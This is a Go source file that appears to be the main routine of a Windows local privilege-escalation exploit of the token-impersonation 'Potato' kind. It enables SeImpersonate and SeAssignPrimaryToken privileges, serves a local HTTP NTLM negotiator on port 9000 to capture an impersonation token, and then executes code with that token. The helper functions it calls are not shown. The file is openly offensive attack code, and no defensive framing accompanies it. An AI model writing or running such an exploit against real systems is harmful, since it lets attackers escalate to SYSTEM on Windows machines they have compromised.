package main

import (
	"fmt"
	"strconv"
)

func main() {
	fmt.Println("[+] Checking privileges")
	canImpersonate := EnablePrivilege(SE_IMPERSONATE)
	canAssignPrimaryToken := EnablePrivilege(SE_ASSIGN_PRIMARY_TOKEN)
	canIncreaseQuoteName := EnablePrivilege(SE_INCREASE_QUOTE_NAME)

	fmt.Println("[+] SeImpersonate " + strconv.FormatBool(canImpersonate))
	fmt.Println("[+] SeAssignPrimaryToken " + strconv.FormatBool(canAssignPrimaryToken))
	fmt.Println("[+] SeIncreaseQuoteName " + strconv.FormatBool(canIncreaseQuoteName))

	if !canImpersonate && !canAssignPrimaryToken {
		fmt.Println("[!] Missing necessary privileges")
		return
	}

	httpNegotiator := HTTPNTLMNegotiator{
		Host: "localhost",
		Port: 9000,
		Chan: make(chan NegotiatorResult),
	}

	token, err := httpNegotiator.Serve()

	/*pipeNegotiator := NamedPipeNegotiator{}
	token, err := pipeNegotiator.Serve()*/

	if err != nil {
		fmt.Println("[!] Failed to get impersonation token")
		return
	}

	ExecuteWithToken(*token)
}
